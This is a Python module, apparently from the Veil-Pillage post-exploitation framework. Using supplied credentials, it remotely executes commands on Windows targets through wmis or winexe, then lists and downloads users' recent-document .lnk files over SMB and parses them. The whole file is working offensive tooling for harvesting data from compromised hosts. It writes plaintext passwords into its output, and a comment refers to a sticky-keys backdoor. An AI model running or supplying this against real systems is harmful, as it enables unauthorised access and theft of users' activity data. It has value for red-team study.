"""

Parses .lnk files from a users Recent Documents and Microsoft Office's recent documents folder

Module built by @byt3bl33d3r

"""

from lib import smb
from lib import command_methods
from lib import helpers
# from lib import pylnk
from lib import pylnker

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Enumerate Recent Documents"
        self.description = "Enumerates all .lnk files from the Recent Documents folder"

        # targets, creds, args, invokemethod can be set on initialization or
        # manually by pillage doing module.targets = list(...) etc. 

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method": ["wmis", "[wmis] or [winexe] for triggering"]}

    def run(self):

        # assume single set of credentials for this module
        username, password = self.creds[0]
        trigger_method = self.required_options["trigger_method"][0]

        for target in self.targets:

            command = "echo %USERPROFILE%"
            user_profile = command_methods.executeResult(target, username, password, command, trigger_method)
            if user_profile == '':
                self.output += " [!] No result file querying env variables using creds " + username + ":" + password + " on: " + target + "\n"
            else:
                user_profile = user_profile.strip(" \r\n")

                recent_path1 = user_profile + "\\Recent"
                recent_path2 = user_profile + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"

                office_path1 = user_profile + "\\Application Data\\Microsoft\\Office\\Recent"
                office_path2 = user_profile + "\\AppData\\Roaming\\Microsoft\\Office\\Recent"

                self.output += " [*] Enumerating recent files on %s \n" % target

                for path in [recent_path1, recent_path2, office_path1, office_path2]:
                    files = smb.ls(target, username, password, path, path_error=False)
                    if len(files) > 0:
                        self.output += " [*] Found %s files \n" % len(files)
                        for file in files:
                            if file[-3:] == "lnk":
                                out = smb.getFile(target, username, password, path + "\\" + file, delete=False)
                                if out == '':
                                    self.output += " [!] Failed retrieving : %s \n" % file
                                else:
                                    save_path = helpers.saveModuleFile(self, target, file, out)
                                    self.output += " [*] .lnk file %s saved from %s to %s\n" % (file,path,save_path)
                                    try:
                                        # parsed_lnk = str(pylnk.parse(save_path)).decode('cp1252')
                                        parsed_lnk = pylnker.parse_lnk(save_path)
                                        details_path = helpers.saveModuleFile(self, target, file + '_details', parsed_lnk)
                                        self.output += " [*] .lnk file %s parsed and saved to %s\n" % (save_path,details_path)
                                    except:
                                        self.output += " [!] Error while parsing : %s \n" % save_path
